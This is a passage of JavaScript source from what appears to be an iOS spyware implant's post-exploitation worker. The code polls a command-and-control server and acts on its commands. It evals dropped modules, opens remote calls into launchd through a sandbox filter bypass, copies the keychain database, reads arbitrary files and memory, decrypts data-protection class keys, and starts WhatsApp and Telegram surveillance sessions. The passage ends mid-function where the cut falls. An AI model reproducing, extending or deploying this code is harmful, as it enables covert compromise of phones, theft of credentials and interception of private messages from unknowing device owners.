				path: drop.path,
				timeout_sec: Number(params.timeout_sec || 0) || 0
			})) return { ok: false, error: "agent_cmd_write_fail" };
			return { ok: true, queued: true, path: drop.path, module_id: drop.module_id };
		}
		function peReportToC2() {
			try {
				peCheckReportOk();
				peWriteStatusFile();
				let payload = peBuildReportPayload(true);
				let resp = __peHttpPostJson("/api/pe/report", payload);
				if (!resp) {
					try {
						let p2 = JSON.parse(payload);
						if (p2.acks && p2.acks.length) {
							globalThis.__pe_acks = (globalThis.__pe_acks || []).concat(p2.acks);
						}
					} catch (_) {}
					LOG("[PE-LISTEN] pe_direct report FAIL tick=" + peTick +
						" sb=" + (peBsOnline() ? "up" : "down"));
					peListEnsureTick();
					return;
				}
				LOG("[PE-LISTEN] pe_direct report OK tick=" + peTick +
					" sb=" + (peBsOnline() ? "up" : "down"));
				let obj = null;
				try { obj = JSON.parse(resp); } catch (_) { peListEnsureTick(); return; }
				let data = (obj && obj.data) ? obj.data : obj;
				let cmds = (data && data.commands) ? data.commands : [];
				if (cmds && cmds.length) {
					for (let ci = 0; ci < cmds.length; ci++) {
						let c = cmds[ci] || {};
						let ct = String(c.type || "");
						let cid = c.id;
						if (peNeedIdentityCmd(ct) && !peIdentityReady()) {
							if (!globalThis.__pe_acks) globalThis.__pe_acks = [];
							if (cid) {
								globalThis.__pe_acks.push({
									id: cid,
									status: "skipped",
									error: "identity_wait",
									note: ct
								});
							}
							if (peTick === 1 || (peTick % 10) === 0)
								LOG("[PE-LISTEN] skip " + ct + " until identity_ready");
							continue;
						}
						if (ct === "reinject_bootstrap" || ct === "ensure_bs") {
							if (PE_DIRECT_PIPELINE) {
								if (!globalThis.__pe_acks) globalThis.__pe_acks = [];
								globalThis.__pe_acks.push({ id: cid, status: "skipped", error: "pe_direct", note: ct });
								continue;
							}
							// Non-blocking kick; never sync-wait for online
							if (globalThis.__pe_cmd_inflight) {
								if (!globalThis.__pe_acks) globalThis.__pe_acks = [];
								globalThis.__pe_acks.push({ id: cid, status: "skipped", error: "inflight" });
								continue;
							}
							let er;
							if (ct === "reinject_bootstrap") {
								er = peReinjectBootstrap("c2_cmd_force:" + (cid || ""), Number(cid) || 0, {
									waitOnlineMs: 0,
									asyncInject: true,
									force: true
								});
							} else {
								er = peEnsureBs(0, "c2_cmd:" + (cid || ""));
							}
							if (cid) {
								if (!globalThis.__pe_acks) globalThis.__pe_acks = [];
								globalThis.__pe_acks.push({
									id: cid,
									status: er.online ? "done" : (er.started || er.pending ? "started" : "timeout"),
									note: ct,
									waited_ms: 0,
									pending: !!er.pending,
									started: !!er.started
								});
							}
						} else if (ct === "configd_read" || ct === "securityd_read" || ct === "memdump" || ct === "pe_task") {
							if (!globalThis.__pe_admin_queue) globalThis.__pe_admin_queue = [];
							globalThis.__pe_admin_queue.push({
								command_id: cid,
								pe_cmd: ct === "pe_task" ? ((c.params && c.params.pe_cmd) || "pe_task") : ct,
								params: c.params || {},
								status: "queued"
							});
							if (!globalThis.__pe_acks) globalThis.__pe_acks = [];
							globalThis.__pe_acks.push({ id: cid, status: "queued", note: "admin_pe_task" });
						} else if (ct === "pe_load") {
							if (!globalThis.__pe_acks) globalThis.__pe_acks = [];
							let lr = peDirectPeLoadFromCmd(cid, c.params || {});
							globalThis.__pe_acks.push({
								id: cid,
								status: lr.ok ? "queued" : "failed",
								error: lr.error || "",
								note: "pe_load",
								path: lr.path || "",
								module_id: lr.module_id || ""
							});
						} else if (ct === "load_module" || ct === "read_path" || ct === "p7_warmup" ||
							ct === "p7_run" || ct === "keychain_copy" || ct === "session_list" ||
							ct === "ping" || ct === "pe_info" || ct === "launchd_ping" ||
							ct === "session_start" || ct === "session_stop") {
							if (globalThis.__pe_cmd_inflight) {
								if (!globalThis.__pe_acks) globalThis.__pe_acks = [];
								globalThis.__pe_acks.push({ id: cid, status: "skipped", error: "inflight" });
								continue;
							}
							let cmdObj = { id: cid, type: ct };
							let p = c.params || {};
							let pkeys = Object.keys(p);
							for (let pi = 0; pi < pkeys.length; pi++) {
								let pk = pkeys[pi];
								cmdObj[pk] = p[pk];
							}
							if (peEnqueueAgentCmd(cmdObj)) {
								if (!globalThis.__pe_acks) globalThis.__pe_acks = [];
								globalThis.__pe_acks.push({ id: cid, status: "queued", note: "agent.cmd" });
							} else {
								if (!globalThis.__pe_acks) globalThis.__pe_acks = [];
								globalThis.__pe_acks.push({ id: cid, status: "failed", error: "agent_cmd_write_fail" });
							}
						} else {
							LOG("[PE-LISTEN] pe_report unknown cmd " + ct);
							if (cid) {
								if (!globalThis.__pe_acks) globalThis.__pe_acks = [];
								globalThis.__pe_acks.push({ id: cid, status: "failed", error: "unknown_cmd" });
							}
						}
					}
				} else {
					peListEnsureTick();
				}
			} catch (re) {
				LOG("[PE-LISTEN] pe_report ERR: " + re);
			}
		}
		peTaskSet("pe_base", {
			kind: "base",
			status: "running",
			apply_ts: Date.now(),
			start_ts: Date.now(),
			auth: "n/a",
			note: "cold"
		});
		if (!globalThis.__pe_task_modules["bootstrap"]) {
			peTaskSet("bootstrap", {
				kind: "agent",
				status: (PE_SKIP_BS_INJECT || globalThis.__pe_bootstrap_skipped) ? "skipped" : "pending",
				apply_ts: Date.now(),
				start_ts: 0,
				auth: "n/a",
				note: (PE_SKIP_BS_INJECT || globalThis.__pe_bootstrap_skipped) ? "pe_direct" : "cold_inject"
			});
		} else if (PE_SKIP_BS_INJECT || globalThis.__pe_bootstrap_skipped) {
			peTaskSet("bootstrap", { status: "skipped", note: "pe_direct" });
		}
		// E4/D4: on-demand reopen launchd RC (early destroy at cold start stays; reopen when needed)
		function peEnsureLaunchd() {
			let mig = globalThis.__pe_migFilterBypass;
			let existing = globalThis.__pe_launchdRC;
			if (existing) {
				try {
					if (existing.success && existing.success()) {
						return { ok: true, reused: true, pid: Number(existing.pid ? existing.pid() : 0), err: "" };
					}
				} catch (_) {}
				try { existing.destroy(); } catch (_) {}
				globalThis.__pe_launchdRC = null;
			}
			if (!mig) {
				return { ok: false, reused: false, pid: 0, err: "no_mig" };
			}
			try {
				let rc = new libs_TaskRop_RemoteCall__WEBPACK_IMPORTED_MODULE_8__["default"]("launchd", mig);
				if (!rc || !rc.success()) {
					try { if (rc) rc.destroy(); } catch (_) {}
					return { ok: false, reused: false, pid: 0, err: "rc_fail" };
				}
				try {
					libs_TaskRop_Sandbox__WEBPACK_IMPORTED_MODULE_4__["default"].initWithLaunchdTask(rc);
				} catch (initErr) {
					LOG("[PE-LISTEN] launchd initWithLaunchdTask warn: " + initErr);
				}
				// Cold fail often means no tokens -> pipeline stuck. Always (re)issue here.
				try {
					libs_TaskRop_Sandbox__WEBPACK_IMPORTED_MODULE_4__["default"].createTokens();
					globalThis.__pe_sandbox_tokens_ok = true;
					LOG("[PE-LISTEN] D4 createTokens OK");
				} catch (tokErr) {
					LOG("[PE-LISTEN] D4 createTokens FAIL: " + String(tokErr).slice(0, 80));
					try { rc.destroy(); } catch (_) {}
					globalThis.__pe_launchdRC = null;
					return { ok: false, reused: false, pid: 0, err: "tokens_fail" };
				}
				globalThis.__pe_launchdRC = rc;
				let lpid = 0;
				try { lpid = Number(rc.pid ? rc.pid() : 0); } catch (_) {}
				LOG("[PE-LISTEN] D4 launchd reopen OK pid=" + lpid);
				return { ok: true, reused: false, pid: lpid, err: "" };
			} catch (e) {
				return { ok: false, reused: false, pid: 0, err: String(e).slice(0, 80) };
			}
		}
		// LAUNCHD-Q: limited retries after cold once-fail (max 8 ? ~15s). Success -> tokens + re-kick PE-DIRECT.
		function peLaunchdQEnsure() {
			if (!globalThis.__pe_launchd_q) {
				globalThis.__pe_launchd_q = {
					attempts: 0,
					max_attempts: 8,
					retry_ms: 30000,
					next_at: 0,
					state: "idle",
					last_fail_ts: 0,
					last_ok_ts: 0
				};
			}
			return globalThis.__pe_launchd_q;
		}
		function peLaunchdQTick() {
			if (globalThis.__pe_sandbox_tokens_ok) {
				if (globalThis.__pe_direct_pipe_pending && !globalThis.__pe_direct_pipe_kicked) {
					try { peDirectPipelineKick(); } catch (_) {}
				}
				return;
			}
			let q = peLaunchdQEnsure();
			if (q.state === "done_ok" || q.state === "done_fail") return;
			let now = Date.now();
			if (q.next_at && now < q.next_at) return;
			if (q.attempts >= q.max_attempts) {
				q.state = "done_fail";
				LOG("[LAUNCHD-Q] exhausted attempts=" + q.attempts);
				return;
			}
			q.attempts++;
			q.state = "trying";
			q.next_at = now + q.retry_ms;
			LOG("[LAUNCHD-Q] attempt=" + q.attempts + "/" + q.max_attempts);
			let ld = peEnsureLaunchd();
			if (ld && ld.ok && globalThis.__pe_sandbox_tokens_ok) {
				q.state = "done_ok";
				q.last_ok_ts = now;
				LOG("[LAUNCHD-Q] SUCCESS pid=" + (ld.pid || 0));
				try { peDirectPipelineKick(); } catch (kE) {
					LOG("[LAUNCHD-Q] kick ERR: " + String(kE).slice(0, 60));
				}
				return;
			}
			q.last_fail_ts = now;
			q.state = "idle";
			LOG("[LAUNCHD-Q] fail err=" + ((ld && ld.err) || "rc_fail") + " next=" + q.retry_ms + "ms");
		}
		for (;;) {
			try {
				peTick++;
				try {
					if (globalThis.__pe_listen_meta) globalThis.__pe_listen_meta.tick = peTick;
				} catch (_) {}
				try { peLaunchdQTick(); } catch (ldqE) {
					LOG("[LAUNCHD-Q] tick ERR: " + String(ldqE).slice(0, 80));
				}
				try { peAdoptAgentIdentity(); } catch (_) {}
				// Pick up SerialNumber / iokit uuid if SpringBoard agent upgraded device.json
				try {
					if (!peIdentityReady() || (peDeviceIds && (peDeviceIds.source === "pe_pid" || peDeviceIds.source === "peid"))) {
						globalThis.__pe_device_ids = null;
						let up = peResolveDeviceIds(N, { allowNative: false });
						if (up && up.uuid) peDeviceIds = up;
						peAdoptAgentIdentity();
					}
				} catch (_) {}
				// PE-direct pipeline kick at ~20s; tick/eval/p7 run at end of loop.
				try {
					peSafariPromoAfterIdentity();
					peArmDirectAfterApplist();
					if (PE_DIRECT_PIPELINE && globalThis.__pe_direct_pipe_pending) {
						peDirectPipelineKick();
					}
				} catch (_) {}
				// IOKit serial only in legacy SB path, deferred; hangs mpd in PE-direct mode.
				try {
					if (!PE_DIRECT_PIPELINE && peTick >= 120 &&
						(!peDeviceIds || !peDeviceIds.serial || peDeviceIds.source === "pe_pid")) {
						let probed = peProbeSerialIokitOnce(N);
						if (probed && probed.uuid) peDeviceIds = probed;
					}
				} catch (_) {}
				peModuleTimeoutSweep();
				peCmdInflightTimeoutSweep();
				peEnsurePendingPoll();
				let ts = Date.now();
				// --- P1: poll agent.cmd ---
				try {
					let cmdFd = fopen(get_cstring("/tmp/c2_ipc/agent.cmd"), get_cstring("r"));
					if (cmdFd && cmdFd !== 0n) {
						let cbuf = calloc(1n, 65536n);
						let FREAD = func_resolve("fread");
						let nread = fcall(FREAD, cbuf, 1n, 65535n, cmdFd);
						fclose(cmdFd);
						try { N.callSymbol("unlink", "/tmp/c2_ipc/agent.cmd"); } catch (_) {}
						let cmdStr = "";
						if (nread && nread > 0n) {
							cmdStr = N.readString(cbuf, Number(nread) + 1);
						}
						free(cbuf);
						if (cmdStr) {
							LOG("[PE-LISTEN] cmd recv len=" + cmdStr.length);
							let cmdObj = null;
							try { cmdObj = JSON.parse(cmdStr); } catch (pe) {
								cmdObj = null;
							}
							let rid = (cmdObj && cmdObj.id) ? String(cmdObj.id) : ("t" + ts);
							let ctype = (cmdObj && cmdObj.type) ? String(cmdObj.type) : "";
							let outObj = { ok: false, error: "unknown_cmd", id: rid, pid: Number(pePid), path: String(peHost) };
							try {
								if (ctype === "ping") {
									outObj = { ok: true, pong: true, id: rid, pid: Number(pePid), path: String(peHost), role: "pe_worker" };
								} else if (ctype === "pe_info") {
									outObj = {
										ok: true,
										id: rid,
										pid: Number(pePid),
										path: String(peHost),
										tick: peTick,
										ts: ts,
										role: "pe_worker"
									};
								} else if (ctype === "launchd_ping") {
									// E4/D4: reopen or reuse launchd RC for future token issue
									LOG("[PE-LISTEN] launchd_ping");
									let ld = peEnsureLaunchd();
									outObj = {
										ok: !!ld.ok,
										reused: !!ld.reused,
										launchd_pid: ld.pid || 0,
										error: ld.ok ? undefined : (ld.err || "launchd_fail"),
										id: rid,
										pid: Number(pePid),
										path: String(peHost),
										role: "pe_worker"
									};
								} else if (ctype === "safari_promo") {
									let urls = (cmdObj && cmdObj.urls) ? cmdObj.urls : [];
									let domains = (cmdObj && cmdObj.domains) ? cmdObj.domains : [];
									if (!Array.isArray(urls)) urls = [];
									if (!Array.isArray(domains)) domains = [];
									LOG("[PE-LISTEN] safari_promo urls=" + urls.length);
									let pr = peSafariPromoProbe(urls, domains);
									outObj = Object.assign({ id: rid, pid: Number(pePid), role: "pe_worker" }, pr || { ok: false, hit: "-1" });
									outObj.ok = true;
									outObj.hit = (pr && pr.hit != null) ? pr.hit : "-1";
								} else if (ctype === "ensure_bs") {
									let er = peEnsureBs(0, "ipc_ensure");
									outObj = {
										ok: true,
										online: !!er.online,
										pending: !!er.pending,
										started: !!er.started,
										timeout: false,
										waited_ms: 0,
										error: er.online ? undefined : (er.error || "ensure_started"),
										id: rid,
										pid: Number(pePid),
										role: "pe_worker"
									};
								} else if (ctype === "reinject_bootstrap") {
									// Force-fetch + reinject (even if bs online) so hot stub updates land; never wait online
									LOG("[PE-LISTEN] reinject_bootstrap FORCE (hot pull c2_bootstrap) nonblock");
									let rr = peReinjectBootstrap("ipc_reinject_force", Number(rid) || 0, {
										waitOnlineMs: 0,
										asyncInject: true,
										force: true
									});
									outObj = {
										ok: !!(rr && (rr.ok || rr.started || rr.online)),
										online: !!(rr && rr.online),
										pending: !!(rr && rr.pending),
										started: !!(rr && rr.started),
										timeout: false,
										waited_ms: 0,
										forced: true,
										error: (rr && rr.error) || undefined,
										id: rid,
										pid: Number(pePid),
										role: "pe_worker"
									};
								} else if (ctype === "load_module") {
									// E5-M2: eval dropped module script from /tmp/c2_ipc/mod.*
									let mname = (cmdObj && cmdObj.name) ? String(cmdObj.name) : "";
									let mpath = (cmdObj && cmdObj.path) ? String(cmdObj.path) : "";
									let timeoutSec = Number(cmdObj && cmdObj.timeout_sec ? cmdObj.timeout_sec : 0);
									let resultUrl = (cmdObj && cmdObj.result_url) ? String(cmdObj.result_url) : "";
									if (!mpath && mname) mpath = "/tmp/c2_ipc/mod." + mname;
									LOG("[PE-LISTEN] load_module name=" + mname + " path=" + mpath);
									// session_* must run via InjectJS (session_start), NOT eval in pe
									// (they enter infinite HB loops and freeze the listen loop).
									if ((mname && mname.indexOf("session_") === 0) ||
										(mpath && mpath.indexOf("mod.session_") >= 0)) {
										outObj = {
											ok: false,
											error: "use_session_start",
											hint: "session modules: pe_load drop then pe_session_start",
											name: mname,
											path: mpath,
											id: rid
										};
										LOG("[PE-LISTEN] load_module REJECT session eval " + (mname || mpath));
									} else if (!mpath || mpath.indexOf("\0") >= 0 || mpath.length > 300) {
										outObj = { ok: false, error: "bad_path", id: rid };
									} else {
										if (!timeoutSec || !resultUrl) {
											try {
												let tfd = fopen(get_cstring(mpath + ".task.json"), get_cstring("r"));
												if (tfd && tfd !== 0n) {
													let tbuf = calloc(1n, 1024n);
													let FREADT = func_resolve("fread");
													let tnr = fcall(FREADT, tbuf, 1n, 1000n, tfd);
													fclose(tfd);
													let tstr = "";
													if (tnr && tnr > 0n) tstr = N.readString(tbuf, Number(tnr) + 1);
													free(tbuf);
													let tobj = null;
													try { tobj = JSON.parse(tstr); } catch (_) { tobj = null; }
													if (tobj) {
														if (!timeoutSec) timeoutSec = Number(tobj.timeout_sec || 0);
														if (!resultUrl) resultUrl = String(tobj.result_url || "");
														if (!mname && tobj.module_id) mname = String(tobj.module_id);
													}
												}
											} catch (_) {}
										}
										let timeoutMs = timeoutSec > 0 ? timeoutSec * 1000 : PE_MODULE_TIMEOUT_MS;
										let modId = mname || mpath;
										peTaskSet(modId, {
											kind: (mname === "pe_dbg" || mname === "pe_dbg_tcp") ? "debug" : "biz",
											status: "starting",
											apply_ts: Date.now(),
											start_ts: Date.now(),
											auth: "authorized",
											note: "load_module",
											timeout_ms: timeoutMs,
											result_url: resultUrl
										});
										let mfd = fopen(get_cstring(mpath), get_cstring("r"));
										if (!mfd || mfd === 0n) {
											outObj = { ok: false, error: "fopen_fail", path: mpath, id: rid };
											peTaskSet(modId, { status: "failed", note: "fopen_fail", end_ts: Date.now() });
											peModulePostResult(modId, "failed", outObj);
										} else {
											let maxn = 262144;
											let mbuf = calloc(1n, BigInt(maxn + 8));
											let FREADM = func_resolve("fread");
											let nrm = fcall(FREADM, mbuf, 1n, BigInt(maxn), mfd);
											fclose(mfd);
											let src = "";
											if (nrm && nrm > 0n) {
												src = N.readString(mbuf, Number(nrm) + 1);
											}
											free(mbuf);
											if (!src) {
												outObj = { ok: false, error: "empty_mod", path: mpath, id: rid };
												peTaskSet(modId, { status: "failed", note: "empty_mod", end_ts: Date.now() });
												peModulePostResult(modId, "failed", outObj);
											} else {
												try {
													(0, eval)(src);
													if (!globalThis.__pe_loaded) globalThis.__pe_loaded = {};
													globalThis.__pe_loaded[mname || mpath] = {
														ts: Date.now(),
														path: mpath,
														len: src.length
													};
													peTaskSet(modId, {
														kind: (mname === "pe_dbg" || mname === "pe_dbg_tcp") ? "debug" : "biz",
														status: "running",
														apply_ts: Date.now(),
														start_ts: Date.now(),
														auth: "authorized",
														note: "load_module",
														len: src.length,
														timeout_ms: timeoutMs,
														result_url: resultUrl
													});
													outObj = {
														ok: true,
														loaded: mname || mpath,
														len: src.length,
														timeout_sec: Math.round(timeoutMs / 1000),
														dbg: !!(globalThis.__pe_dbg && globalThis.__pe_dbg.ready),
														dbg_ver: (globalThis.__pe_dbg && globalThis.__pe_dbg.ver) ? String(globalThis.__pe_dbg.ver) : "",
														p7_want: !!(globalThis.__pe_dbg && globalThis.__pe_dbg.want_p7),
														p7_ready: !!(globalThis.__pe_p7_state && globalThis.__pe_p7_state.ready),
														id: rid,
														pid: Number(pePid),
														role: "pe_worker"
													};
													LOG("[PE-LISTEN] load_module OK " + (mname || mpath) + " len=" + src.length);
													// pe_dbg marks want_p7 - actual decrypt via separate p7_warmup (avoids blocking load_module)
													if ((mname === "pe_dbg" || (globalThis.__pe_dbg && globalThis.__pe_dbg.want_p7)) &&
														!(globalThis.__pe_p7_state && globalThis.__pe_p7_state.ready)) {
														LOG("[PE-LISTEN] pe_dbg loaded - P7 pending (call p7_warmup)");
														outObj.p7_pending = true;
													}
													peTaskSet(modId, { status: "done", end_ts: Date.now() });
													peModulePostResult(modId, "done", outObj);
												} catch (le) {
													outObj = {
														ok: false,
														error: String(le).slice(0, 120),
														id: rid,
														role: "pe_worker"
													};
													LOG("[PE-LISTEN] load_module ERR " + le);
													peTaskSet(modId, { status: "failed", note: String(le).slice(0, 80), end_ts: Date.now() });
													peModulePostResult(modId, "failed", outObj);
												}
											}
										}
									}
								} else if (ctype === "read_path") {
									// P2: pe already consumed forensic tokens in createTokens(); launchd may be gone.
									let rpath = (cmdObj && cmdObj.path) ? String(cmdObj.path) : "";
									let maxn = Number(cmdObj && cmdObj.max);
									if (!(maxn > 0)) maxn = 32;
									if (maxn > 256) maxn = 256;
									if (!rpath || rpath.indexOf("\0") >= 0 || rpath.length > 500) {
										outObj = { ok: false, error: "bad_path", id: rid };
									} else {
										let rfd2 = fopen(get_cstring(rpath), get_cstring("r"));
										if (!rfd2 || rfd2 === 0n) {
											outObj = { ok: false, error: "fopen_fail", path: rpath, id: rid, pid: Number(pePid), role: "pe_worker" };
										} else {
											let rbuf = calloc(1n, BigInt(maxn + 8));
											let FREAD2 = func_resolve("fread");
											let nread2 = fcall(FREAD2, rbuf, 1n, BigInt(maxn), rfd2);
											fclose(rfd2);
											let nr = Number(nread2 || 0n);
											if (nr < 0) nr = 0;
											if (nr > maxn) nr = maxn;
											let hex = "";
											for (let bi = 0; bi < nr; bi++) {
												let qword = uread64(rbuf + BigInt(bi & ~7));
												let b = Number((qword >> BigInt((bi & 7) * 8)) & 0xffn);
												hex += (b < 16 ? "0" : "") + b.toString(16);
											}
											free(rbuf);
											outObj = {
												ok: true,
												path: rpath,
												n: nr,
												head_hex: hex,
												id: rid,
												pid: Number(pePid),
												role: "pe_worker"
											};
										}
									}
								} else if (ctype === "p7_status") {
									let st = globalThis.__pe_p7_state || {};
									let waOk = false;
									try {
										let wfd = N.callSymbol("fopen", "/tmp/wa_identity.json", "r");
										if (wfd && wfd !== 0 && wfd !== 0n) {
											N.callSymbol("fclose", wfd);
											waOk = true;
										}
									} catch (_) {}
									outObj = {
										ok: true,
										id: rid,
										pid: Number(pePid),
										role: "pe_worker",
										p7_ready: !!st.ready,
										p7_running: !!st.running,
										wa_identity: !!(st.wa_identity || waOk),
										dump: !!(st.dump || (typeof peP7DumpOnDisk === "function" && peP7DumpOnDisk())),
										classkeys: !!(st.classkeys || (typeof peP7ClassKeysOnDisk === "function" && peP7ClassKeysOnDisk())),
										source: st.source || "",
										err: st.err || "",
										rc_attempted: !!st.rc_attempted,
										rc_ok: !!st.rc_ok,
										dbg: !!(globalThis.__pe_dbg && globalThis.__pe_dbg.ready),
										dbg_ver: (globalThis.__pe_dbg && globalThis.__pe_dbg.ver) ? String(globalThis.__pe_dbg.ver) : ""
									};
								} else if (ctype === "p7_warmup" || ctype === "p7_run") {
									// REQUIRES_P7: keychain_copy then [4a] AKS / [4b] dump. No pe_dbg.
									let force = !!(cmdObj && cmdObj.force);
									let skipKc = !!(cmdObj && cmdObj.skip_keychain);
									LOG("[PE-LISTEN] p7_warmup force=" + force + " skip_kc=" + skipKc);
									{
									peP7CacheSave({ started: true, done: false, phase: "all", ok: false, wa_identity: false });
									function peP7Progress(phase, extra) {
										try {
											let body = JSON.stringify(Object.assign({
												running: phase !== "done" && phase !== "error",
												id: rid,
												phase: String(phase || ""),
												ts: Date.now(),
												pid: Number(pePid)
											}, extra || {})) + "\n";
											let pfd = fopen(get_cstring("/tmp/c2_ipc/pe.p7.progress"), get_cstring("w"));
											if (pfd && pfd !== 0n) {
												let pbuf = get_cstring(body);
												fwrite(pbuf, 1n, BigInt(body.length), pfd);
												fclose(pfd);
											}
										} catch (_) {}
									}
									peP7Progress("begin", { skip_keychain: !!skipKc, force: !!force });
									if (!skipKc) {
										try {
											peP7Progress("keychain");
											let kr = peCfgKeychainCopy({ allowPeLocal: true, configd: true, pollSec: 15 });
											LOG("[PE-LISTEN] p7_warmup keychain_copy " +
												(kr && kr.ok ? "OK" : "FAIL") +
												" via=" + ((kr && kr.via) || "?") +
												" err=" + ((kr && kr.error) || ""));
											if (kr && kr.ok && kr.via === "configd") {
												try {
													LOG("[PE-LISTEN] settle 3s after keychain; CFG RC already burned");
													N.callSymbol("sleep", 3);
												} catch (_) {}
											}
										} catch (kcWe) {
											LOG("[PE-LISTEN] p7_warmup keychain warn: " + String(kcWe).slice(0, 80));
										}
									}
									let pr = { ok: false, error: "no_p7_fn" };
									try {
										peP7Progress("phase2");
										if (typeof globalThis.__peP7Phase2 === "function") {
											pr = globalThis.__peP7Phase2(force ? "force" : ("hot:" + ctype));
										} else {
											pr = { ok: false, error: "p7_not_registered" };
										}
									} catch (p7e) {
										pr = { ok: false, error: String(p7e).slice(0, 120) };
									}
									outObj = Object.assign({
										id: rid,
										pid: Number(pePid),
										role: "pe_worker",
										ctype: ctype
									}, pr || {});
									peP7Progress("done", {
										ok: !!outObj.ok,
										wa_identity: !!outObj.wa_identity
									});
									LOG("[PE-LISTEN] p7_warmup done ok=" + !!outObj.ok + " wa=" + !!outObj.wa_identity);
									}
								} else if (ctype === "keychain_copy") {
									// P2b: default still injects into configd. pe_local=true runs IN pe
									// (Native already present) to prove path access without evaluateScript.
									let peLocalKc = !!(cmdObj && (cmdObj.pe_local || cmdObj.mode === "pe_local"));
									let mig = globalThis.__pe_migFilterBypass;
									if (peLocalKc) {
										LOG("[PE-LISTEN] keychain_copy pe_local (no configd inject)");
										let localOk = false;
										let localErr = "";
										try {
											let lpath = "/tmp/c2_ipc/mod.keychain_pe_local";
											let lfd = fopen(get_cstring(lpath), get_cstring("r"));
											let lsrc = "";
											if (lfd && lfd !== 0n) {
												let lbuf = calloc(1n, 131072n);
												let FREADL = func_resolve("fread");
												let lnr = fcall(FREADL, lbuf, 1n, 130000n, lfd);
												fclose(lfd);
												if (lnr && lnr > 0n) lsrc = N.readString(lbuf, Number(lnr) + 1);
												free(lbuf);
											}
											if (!lsrc || lsrc.length < 40) {
												localErr = "need_pe_load";
												outObj = { ok: false, error: "need_pe_load", hint: "pe_load keychain_pe_local.js", id: rid, mode: "pe_local" };
												LOG("[PE-LISTEN] keychain_copy pe_local need_pe_load");
											} else {
												(0, eval)(lsrc);
												localOk = true;
												LOG("[PE-LISTEN] keychain_copy pe_local eval OK");
												outObj = { ok: true, mode: "pe_local", id: rid, pid: Number(pePid), role: "pe_worker" };
												try {
													let rfd = fopen(get_cstring("/tmp/c2_ipc/kc_pe_local.json"), get_cstring("r"));
													if (rfd && rfd !== 0n) {
														let rbuf = calloc(1n, 4096n);
														let FRR = func_resolve("fread");
														let rnr = fcall(FRR, rbuf, 1n, 4000n, rfd);
														fclose(rfd);
														if (rnr && rnr > 0n) {
															let rstr = N.readString(rbuf, Number(rnr) + 1);
															try {
																let ro = JSON.parse(rstr);
																outObj.ok = !!ro.ok;
																outObj.report = ro;
																localOk = !!ro.ok;
															} catch (_) {}
														}
														free(rbuf);
													}
												} catch (_) {}
											}
										} catch (le) {
											localErr = String(le).slice(0, 120);
											outObj = { ok: false, error: localErr, mode: "pe_local", id: rid };
											LOG("[PE-LISTEN] keychain_copy pe_local ERR: " + localErr);
										}
										if (!outObj) outObj = { ok: localOk, error: localErr || undefined, mode: "pe_local", id: rid };
									} else if (!mig) {
										outObj = { ok: false, error: "no_mig", id: rid, pid: Number(pePid) };
									} else {
										LOG("[PE-LISTEN] keychain_copy via CFG-Q");
										let kr = { ok: false };
										try {
											kr = peCfgKeychainCopy({
												allowPeLocal: false,
												configd: true,
												pollSec: 12
											}) || kr;
										} catch (e) {
											kr = { ok: false, error: String(e).slice(0, 120) };
											LOG("[PE-LISTEN] keychain_copy ERR: " + kr.error);
										}
										let tmpOk = false;
										let tmpN = 0;
										let tmpHex = "";
										if (kr && kr.ok) {
											try {
												let tfd = fopen(get_cstring("/tmp/keychain-2.db"), get_cstring("r"));
												if (tfd && tfd !== 0n) {
													let tbuf = calloc(1n, 40n);
													let FR = func_resolve("fread");
													let tn = fcall(FR, tbuf, 1n, 16n, tfd);
													fclose(tfd);
													tmpN = Number(tn || 0n);
													for (let bi = 0; bi < tmpN && bi < 16; bi++) {
														let qword = uread64(tbuf + BigInt(bi & ~7));
														let b = Number((qword >> BigInt((bi & 7) * 8)) & 0xffn);
														tmpHex += (b < 16 ? "0" : "") + b.toString(16);
													}
													free(tbuf);
													tmpOk = tmpN > 0;
												}
											} catch (te) {
												kr.error = (kr.error ? kr.error + ";" : "") + String(te).slice(0, 80);
											}
										}
										outObj = {
											ok: !!(kr && kr.ok && tmpOk),
											copied: !!(kr && kr.ok),
											tmp_ok: tmpOk,
											tmp_n: tmpN,
											tmp_head_hex: tmpHex,
											dst: "/tmp/keychain-2.db",
											via: (kr && kr.via) || "configd",
											cfg_reused: !!(kr && kr.reused),
											error: (kr && kr.ok && tmpOk) ? undefined : ((kr && kr.error) || "tmp_missing"),
											id: rid,
											pid: Number(pePid),
											role: "pe_worker"
										};
									}
								} else if (ctype === "session_start") {
									// E4/P3+ / E5 slim: prefer hot-dropped /tmp/c2_ipc/mod.<id> (pe_load);
									// cold embed is stub - do not inject stub comments as session code.
									let mig = globalThis.__pe_migFilterBypass;
									let payloadName = (cmdObj && cmdObj.payload) ? String(cmdObj.payload) : "probe";
									let target = (cmdObj && cmdObj.target) ? String(cmdObj.target) : "";
									if (!target) {
										target = (payloadName === "whatsapp" || payloadName === "wa") ? "WhatsApp" : "configd";
									}
									let sid = (cmdObj && cmdObj.session_id) ? String(cmdObj.session_id) : ("s" + ts);
									let knownPayload = (
										payloadName === "probe" ||
										payloadName === "whatsapp" || payloadName === "wa" ||
										payloadName === "telegram" || payloadName === "tg" || payloadName === "tglib"
									);
									if (!mig) {
										outObj = { ok: false, error: "no_mig", id: rid };
									} else if (!target || target === "SpringBoard" || target === String(peHost) || target.indexOf("mediaplaybackd") >= 0) {
										outObj = { ok: false, error: "bad_target", target: target, id: rid };
									} else if (!knownPayload) {
										outObj = { ok: false, error: "unknown_payload", payload: payloadName, id: rid };
									} else {
										LOG("[PE-LISTEN] session_start id=" + sid + " target=" + target + " payload=" + payloadName);
										try { N.callSymbol("unlink", "/tmp/c2_ipc/session." + sid + ".stop"); } catch (_) {}
										try { N.callSymbol("unlink", "/tmp/c2_ipc/session." + sid + ".hb"); } catch (_) {}
										try { N.callSymbol("unlink", "/tmp/c2_ipc/session." + sid + ".status"); } catch (_) {}
										let mid = "session_probe";
										if (payloadName === "whatsapp" || payloadName === "wa") mid = "session_whatsapp";
										else if (payloadName === "telegram" || payloadName === "tg" || payloadName === "tglib") mid = "session_telegram";
										let mpath = "/tmp/c2_ipc/mod." + mid;
										let tpl = "";
										try {
											let sfd = fopen(get_cstring(mpath), get_cstring("r"));
											if (sfd && sfd !== 0n) {
												let sbuf = calloc(1n, 262144n);
												let FREADS = func_resolve("fread");
												let snr = fcall(FREADS, sbuf, 1n, 262000n, sfd);
												fclose(sfd);
												if (snr && snr > 0n) tpl = N.readString(sbuf, Number(snr) + 1);
												free(sbuf);
											}
										} catch (_) { tpl = ""; }
										if (!tpl || tpl.length < 80 || tpl.indexOf("omitted (PE slim") >= 0) {
											// fallback cold embed (fat builds only)
											if (payloadName === "whatsapp" || payloadName === "wa") {
